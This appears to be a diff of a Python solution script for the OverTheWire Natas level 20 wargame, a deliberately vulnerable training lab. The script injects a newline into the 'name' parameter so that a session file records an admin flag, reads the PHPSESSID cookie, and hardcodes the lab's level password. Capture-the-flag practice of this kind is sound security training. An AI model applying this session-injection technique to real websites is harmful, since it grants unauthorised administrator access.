@@ -1,22 +1,12 @@
 import requests
 
-target = 'http://natas20.natas.labs.overthewire.org'
-auth = ('natas20', 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')
+# Constants
+BASE_URL = 'http://natas20.natas.labs.overthewire.org'
+BASE_USERNAME = 'natas20'
+BASE_PASSWORD = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'
 
-print("#")
-print("# FIRST REQUEST")
-print("#")
-params = dict(name='admin\nadmin 1', debug='')
-cookies = dict()
-r = requests.get(target, auth=auth, params=params, cookies=cookies)
-phpsessid = r.cookies['PHPSESSID']
-print(r.text)
-
-print("\n\n")
-print("#")
-print("# SECOND REQUEST")
-print("#")
-params = dict(debug='')
-cookies = dict(PHPSESSID=phpsessid)
-r = requests.get(target, auth=auth, params=params, cookies=cookies)
-print(r.text)
+# Request to check PHPSESSID is correct
+params_first = dict(name='test\nadmin 1', debug='')
+response_first = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params=params_first)
+phpsessid = response_first.cookies['PHPSESSID']
+print(response_first.text)
